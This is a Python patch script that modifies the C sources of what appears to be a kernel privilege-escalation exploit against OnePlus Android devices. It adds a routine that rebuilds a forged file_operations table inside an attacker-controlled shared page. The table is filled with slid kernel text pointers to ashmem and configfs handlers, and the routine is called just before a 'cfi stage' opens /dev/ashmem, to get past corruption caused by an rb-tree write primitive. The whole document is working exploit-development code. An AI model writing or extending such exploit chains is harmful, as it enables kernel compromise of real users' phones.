#!/usr/bin/env python3
"""patch_repair_fops_page.py

The mode-4 PI write clobbers the fake file_operations table living in our page
(documented: the rb-tree collateral writes TARGET into fake_fops+0x08=llseek).
The canon run (dump86) shows misc_open() reads c->fops=fake_fops and then
try_module_get(fops->owner) faults with a garbage owner -> the walk also
clobbered page[0x100] (owner).  Since the page is our MAP_SHARED mapping, we can
simply rewrite the whole fops table right before try_cfi_stage() opens
/dev/ashmem.  This adds ssopt_repair_fake_fops_page() and calls it before open.
"""
import os
CORE="/root/ghostlock/ghostlock-oneplus/src/core"
U=os.path.join(CORE,"util.c"); C=os.path.join(CORE,"common.h"); F=os.path.join(CORE,"fops.c")

s=open(U).read()
assert "ssopt_repair_fake_fops_page" not in s, "util.c already patched"
anchor = "void put_fake_fops_table(unsigned char *p, size_t off) {"
assert s.count(anchor)==1, ("anchor", s.count(anchor))
add = """/* Rewrite the fake fops table inside our page (MAP_SHARED) after the walk.
 * The rb-tree PI write clobbers slots of the table (llseek at least, observed
 * owner too), and misc_open() reads c->fops->owner right away -> rewrite the
 * whole table with the correct (slid) pointers before opening /dev/ashmem. */
void ssopt_repair_fake_fops_page(void) {
  if (!perf_page_map || !fake_fops) return;
  size_t poff = (size_t)(FOPS_TABLE_OFF - LOCK_OFF);   /* fake_fops page off */
  unsigned char *p = perf_page_map + poff;
  uint64_t owner_before = *(volatile uint64_t *)(p + FOPS_OWNER_OFF);
  put64(p, FOPS_OWNER_OFF, 0);
  put64(p, FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
  put64(p, FOPS_READ_OFF, 0);
  put64(p, FOPS_WRITE_OFF, 0);
  put64(p, FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
  pr_info("ssopt fops page repair: poff=%#zx owner_before=%016llx "
          "llseek=%016llx open=%016llx\\n",
          poff, (unsigned long long)owner_before,
          (unsigned long long)text_addr(NOOP_LLSEEK),
          (unsigned long long)text_addr(ASHMEM_OPEN));
  fsync(1);
}

"""
s=s.replace(anchor, add+anchor, 1)
open(U,"w").write(s)
print("util.c: ssopt_repair_fake_fops_page")

s=open(C).read()
assert "ssopt_repair_fake_fops_page" not in s
anchor2="void put_fake_fops_table(unsigned char *p, size_t off);"
assert s.count(anchor2)==1
s=s.replace(anchor2, anchor2+"\nvoid ssopt_repair_fake_fops_page(void);", 1)
open(C,"w").write(s)
print("common.h: decl")

s=open(F).read()
assert "ssopt_repair_fake_fops_page" not in s
anchor3="""int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
"""
add3="""int try_cfi_stage(void) {
  cfi_attempts++;
  /* Undo the walk's clobber of the fake fops table (owner/llseek etc.) before
   * misc_open() dereferences it. */
  ssopt_repair_fake_fops_page();
  int fd = open_ashmem_device();
"""
assert s.count(anchor3)==1, ("try_cfi_stage", s.count(anchor3))
s=s.replace(anchor3, add3, 1)
open(F,"w").write(s)
print("fops.c: call repair before open")
